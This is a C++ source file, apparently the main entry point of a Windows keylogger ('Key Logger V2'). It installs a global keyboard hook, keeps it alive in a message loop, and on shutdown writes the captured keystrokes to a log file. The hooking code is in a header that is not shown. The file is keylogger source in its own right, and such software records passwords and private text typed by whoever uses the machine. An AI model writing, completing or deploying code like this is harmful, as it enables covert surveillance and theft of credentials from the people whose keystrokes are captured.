/*
	The most basic program with core functionalities:
	1) Log Keys pressed to Log file						done
	2) Application Logging to file						done
*/

#include <iostream>
#include <csignal>
#include <windows.h>

#include "KeyLogger.h"

void signalHandler(int signum) {
	//AppLog::Write("Logged Keys:\n" + keylogger::keylog);
	keylogger::WriteToFile();
	AppLog::Write("Application Shutdown Initiated...");
	if (keylogger::IsHooked()) {
		keylogger::UninstallHook();
	}
	AppLog::Write("Application Shutdown Completed");
	AppLog::CloseApplicationLog();
	exit(signum);
}

int main(int argc, char* argv[]) {

	// register signal SIGINT and signal handler  
	signal(SIGINT, signalHandler);

	AppLog::InitializeApplicationLog();

	std::cout << "Starting Key Logger V2....." << std::endl
		<< "Program Name: " << argv[0] << std::endl
		<< "Application Started at Date Time: " << DateTime::GetCurrentDateTimeString() << std::endl;
	AppLog::Write("Started Application");

	if (keylogger::InstallHook()) {
		AppLog::Write("Keyboard Hook Installation Complete!");
	}
	else {
		AppLog::Write("Keyboard Hook Installation Unsuccessfull!");
		signalHandler(SIGTERM);
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) { // keep the main running in infinite loop
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}